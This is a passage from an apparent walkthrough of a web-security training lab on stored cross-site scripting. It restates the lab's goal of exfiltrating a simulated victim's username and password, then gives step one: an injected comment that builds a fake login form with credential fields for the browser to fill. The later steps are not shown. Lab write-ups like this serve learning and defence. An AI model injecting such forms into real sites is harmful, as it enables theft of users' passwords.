### Lab: Exploiting cross-site scripting to capture passwords

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

**Note**  

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the credentials.

Analysis and Exploitation:

1. Post comment with HTML to build a simplified form with username and password fields.

Set IDs to easily select them from Javascript.
```html
<section>
    <form class=login-form method=POST action=/login>
        <label>Username</label>
            <input required type=username name="username" id="usertohack">
        <label>Password</label>
            <input required type=password name="password" id="pswtohack">
    </form>
</section>
```
